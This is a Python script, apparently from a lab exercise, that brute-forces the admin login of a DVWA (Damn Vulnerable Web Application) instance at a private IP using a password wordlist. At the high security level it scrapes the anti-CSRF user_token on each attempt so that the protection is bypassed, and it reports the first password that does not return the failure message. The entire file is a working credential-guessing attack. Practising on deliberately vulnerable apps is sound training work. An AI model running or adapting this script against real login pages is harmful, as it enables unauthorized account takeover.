from utils import *
import sys


def get_passwords(filename):
    q = []
    with open(filename, 'r') as f:
        for e in f.read().split("\n"):
            q.append(e)

    return q

def send_credentials(session, url, data):

    target_url = url
    for k, v in data.items():
        target_url+=f"{k}={v}&"
    target_url = target_url[:-1]+"#"
    response = session.get(target_url)   
    return response

if __name__=="__main__":
    BASE_URL = "http://10.10.36.246"
    bruteforce_url = f"{BASE_URL}/vulnerabilities/brute?"
    filename = sys.argv[1]
    username = "admin"

    q = get_passwords(filename)   

    with DVWASessionProxy(BASE_URL) as s:
        s.security = SecurityLevel.HIGH
        for password in q:
                      
            data = {
            "username": username,
            "password": password,
            "Login": "Login"
            }

            if s.security is SecurityLevel.HIGH.value:

                response = s.get(bruteforce_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                user_token = soup.find("input", {"name": "user_token"})["value"]
                data["user_token"] = user_token
            response = send_credentials(s, bruteforce_url, data)
            print(" "*40, end="\r")
            print(f"[!] Testing: {password}", end="\r")
            if "password incorrect." not in response.text:
                print("")
                print(f"[+] Found: {password}")
                break
